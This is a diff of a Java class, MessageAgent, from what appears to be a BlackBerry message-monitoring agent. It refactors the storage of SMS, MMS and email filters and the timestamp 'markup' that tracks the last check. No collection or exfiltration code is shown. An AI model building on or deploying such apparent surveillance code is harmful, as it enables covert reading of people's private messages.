@@ -2,7 +2,10 @@ package blackberry.agent;
 
 import java.io.IOException;
 import java.util.Date;
+import java.util.Hashtable;
 import java.util.Vector;
+
+import net.rim.device.api.util.IntHashtable;
 
 import blackberry.config.Keys;
 import blackberry.log.Log;
@@ -47,15 +50,12 @@ public class MessageAgent extends Agent {
 	MailListener mailListener;
 	Markup markupDate;
 
-	long timestamp;
-
-	long firsttimestamp = 0;
+	public long lastcheck = 0;
 
 	protected String identification;
-	public Vector filtersSMS = new Vector();
-
-	public Vector filtersMMS = new Vector();
-	public Vector filtersEMAIL = new Vector();
+	public IntHashtable filtersSMS = new IntHashtable();
+	public IntHashtable filtersMMS = new IntHashtable();
+	public IntHashtable filtersEMAIL = new IntHashtable();
 
 	public MessageAgent(final boolean agentStatus) {
 		super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");
@@ -98,36 +98,6 @@ public class MessageAgent extends Agent {
 		log.close();
 	}
 
-	long initMarkup() {
-		long lastcheck = 0;
-		if (markupDate.isMarkup() == false) {
-			// #debug debug
-			debug.trace("Il Markup non esiste, timestamp = 0 ");
-			timestamp = 0;
-			final Date date = new Date();
-			firsttimestamp = date.getTime();
-
-		} else {
-			// serializzi la data date
-			final Date date = new Date();
-			timestamp = date.getTime();
-
-			byte[] deserialized;
-			// #debug debug
-			debug.trace("Sto leggendo dal markup");
-			try {
-				deserialized = markupDate.readMarkup();
-				lastcheck = Utils.byteArrayToLong(deserialized, 0);
-
-			} catch (final IOException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-
-		}
-		return lastcheck;
-	}
-
 	protected boolean parse(final byte[] conf) {
 
 		final Vector tokens = tokenize(conf);
@@ -159,17 +129,17 @@ public class MessageAgent extends Agent {
 						case Filter.CLASS_EMAIL:
 							// #debug debug
 							debug.trace("Adding email filter: " + filter.type);
-							filtersEMAIL.addElement(filter);
+							filtersEMAIL.put(filter.type, filter);
 							break;
 						case Filter.CLASS_MMS:
 							// #debug debug
 							debug.trace("Adding mms filter: " + filter.type);
-							filtersMMS.addElement(filter);
+							filtersMMS.put(filter.type, filter);
 							break;
 						case Filter.CLASS_SMS:
 							// #debug debug
 							debug.trace("Adding sms filter: " + filter.type);
-							filtersSMS.addElement(filter);
+							filtersSMS.put(filter.type, filter);
 							break;
 						case Filter.CLASS_UNKNOWN: // fall through
 						default:
@@ -218,10 +188,37 @@ public class MessageAgent extends Agent {
 		return tokens;
 	}
 
+	long initMarkup() {
+
+		if (markupDate.isMarkup() == false) {
+			// #debug debug
+			debug.trace("Il Markup non esiste, timestamp = 0 ");
+			final Date date = new Date();
+			lastcheck = 0;
+
+		} else {
+			byte[] deserialized;
+			// #debug debug
+			debug.trace("Sto leggendo dal markup");
+			try {
+				deserialized = markupDate.readMarkup();
+				lastcheck = Utils.byteArrayToLong(deserialized, 0);
+
+			} catch (final IOException e) {
+				// #debug error
+				debug.error("Cannot read markup: " + e);
+			}
+
+		}
+		return lastcheck;
+	}
+
 	void updateMarkup() {
 		// #debug debug
 		debug.trace("Sto scrivendo nel markup");
-		final byte[] serialize = Utils.longToByteArray(timestamp);
+		final Date date = new Date();
+		lastcheck = date.getTime();
+		final byte[] serialize = Utils.longToByteArray(lastcheck);
 		markupDate.writeMarkup(serialize);
 	}
 }
